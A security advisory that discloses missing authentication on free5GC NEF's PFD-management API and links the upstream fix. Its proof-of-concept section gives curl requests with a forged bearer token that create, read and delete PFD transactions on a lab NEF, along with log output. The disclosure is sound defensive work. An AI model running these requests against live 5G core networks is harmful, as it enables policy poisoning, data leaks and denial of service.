# [C] free5GC's NEF 3gpp-pfd-management API is unauthenticated; forged bearer tokens can create, read, and delete PFD transactions

## Summary
Severity: Critical
Advisory: GHSA-5f62-53r8-qrqf
CVE: CVE-2026-44315
CWE: CWE-862
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:H (CVSS_V3)
Published: 2026-05-08
Source: https://github.com/advisories/GHSA-5f62-53r8-qrqf
Type: github-advisory

## Affected
- Go: `github.com/free5gc/nef` — affected >=0

## Details
### Summary
free5GC's NEF mounts the `3gpp-pfd-management` API without inbound OAuth2/bearer-token authorization. A network attacker who can reach NEF on the SBI can create, read, and delete PFD-management transaction state with a forged or arbitrary bearer token (e.g. `Authorization: Bearer not-a-real-token`). The route group is also reachable even when the running config's `ServiceList` does not declare it, so operators who think they disabled the service via config are still exposed.

### Details
Validated against the NEF container in the official Docker compose lab.
- Source repo tag: `v4.2.1`
- Running Docker image: `free5gc/nef:v4.2.0`
- Runtime NEF commit: `5ce35eab`
- Docker validation date: 2026-03-11

NEF advertises `OAuth2 setting receive from NRF: true`, and its `ServiceList` only declares `nnef-pfdmanagement` and `nnef-oam`. Despite that, the `3gpp-pfd-management` route group is mounted and reachable with no inbound auth middleware.

Code evidence (paths in `free5gc/nef`):
- Route group mounted without auth middleware: `NFs/nef/internal/sbi/server.go:52`
- Transaction routes exposed at `/:scsAsID/transactions` and `/:scsAsID/transactions/:transID`: `NFs/nef/internal/sbi/api_pfd.go:13`
- Create handler still contains `// TODO: Authorize the AF`: `NFs/nef/internal/sbi/processor/pfd.go:70`
- POST allocates a new PFD transaction and writes to UDR: `NFs/nef/internal/sbi/processor/pfd.go:63`
- GET reads transaction state: `NFs/nef/internal/sbi/processor/pfd.go:189`
- DELETE removes transaction state: `NFs/nef/internal/sbi/processor/pfd.go:328`
- NEF context only exposes outbound token acquisition (`GetTokenCtx`); there is no inbound authorization path: `NFs/nef/internal/context/nef_context.go:153`
- Config validation only allows `nnef-pfdmanagement` and `nnef-oam`: `NFs/nef/pkg/factory/config.go:126`

### PoC
Reproduced end-to-end against the running NEF at `http://10.100.200.19:8000` using a fabricated bearer token.

1. Seed an AF context (also accepted with forged token):
```
curl -i \
  -H 'Authorization: Bearer not-a-real-token' \
  -H 'Content-Type: application/json' \
  --data '{"afServiceId":"svc-seed2","afAppId":"app-seed2","dnn":"internet","snssai":{"sst":1,"sd":"010203"},"anyUeInd":true,"trafficFilters":[{"flowId":1,"flowDescriptions":["permit out ip from 192.0.2.31 to 198.51.100.0/24"]}],"trafficRoutes":[{"dnai":"mec-seed2","routeInfo":{"ipv4Addr":"10.60.0.1","portNumber":0}}]}' \
  http://10.100.200.19:8000/3gpp-traffic-influence/v1/af-poc-pfd2/subscriptions
```

2. CREATE PFD transaction with forged token -> `201 Created`:
```
curl -i \
  -H 'Authorization: Bearer not-a-real-token' \
  -H 'Content-Type: application/json' \
  --data '{"pfdDatas":{"app-poc-pfd2":{"externalAppId":"app-poc-pfd2","pfds":{"pfd-poc":{"pfdId":"pfd-poc","urls":["^http://poc.example.com(/\\\\S*)?$"]}}}}}' \
  http://10.100.200.19:8000/3gpp-pfd-management/v1/af-poc-pfd2/transactions
```

3. READ -> `200 OK`:
```
curl -i -H 'Authorization: Bearer not-a-real-token' \
  http://10.100.200.19:8000/3gpp-pfd-management/v1/af-poc-pfd2/transactions/1
```

4. DELETE -> `204 No Content`:
```
curl -i -X DELETE -H 'Authorization: Bearer not-a-real-token' \
  http://10.100.200.19:8000/3gpp-pfd-management/v1/af-poc-pfd2/transactions/1
```

5. READ again -> `404 PFD transaction not found`, confirming state was actually deleted.

NEF container logs (`docker logs nef`) show the requests reaching business handlers and returning success codes:
```
[INFO][NEF][PFDMng] PostPFDManagementTransactions - scsAsID[af-poc-pfd2]
[INFO][NEF][GIN] | 201 | POST   | /3gpp-pfd-management/v1/af-poc-pfd2/transactions
[INFO][NEF][PFDMng] GetIndividualPFDManagementTransaction - scsAsID[af-poc-pfd2], transID[1]
[INFO][NEF][GIN] | 200 | GET    | /3gpp-pfd-management/v1/af-poc-pfd2/transactions/1
[INFO][NEF][PFDMng] DeleteIndividualPFDManagementTransaction - scsAsID[af-poc-pfd2], transID[1]
[INFO][NEF][GIN] | 204 | DELETE | /3gpp-pfd-management/v1/af-poc-pfd2/transactions/1
```

### Impact
Missing inbound authentication (CWE-306) and authorization (CWE-862) on a critical SBI surface in NEF. Any party that can reach NEF on the SBI network can:
- Create attacker-controlled PFD transactions (which are written to UDR), poisoning policy state used downstream by SMF/UPF for traffic classification.
- Read existing PFD transactions, leaking AF-supplied policy data.
- Delete PFD transactions, denying service to legitimately provisioned application detection rules.

The PFD-management route group is also reachable even when the runtime `ServiceList` does not declare it, so operators relying on `ServiceList` to disable the service do not actually get that protection.

Affected: free5gc <=v4.2.1.

Upstream issue: https://github.com/free5gc/free5gc/issues/858
Upstream fix: https://github.com/free5gc/nef/pull/23

## References
- https://github.com/free5gc/free5gc/security/advisories/GHSA-5f62-53r8-qrqf
- https://nvd.nist.gov/vuln/detail/CVE-2026-44315
- https://github.com/free5gc/free5gc/issues/858
- https://github.com/free5gc/nef/pull/23
- https://github.com/free5gc/free5gc
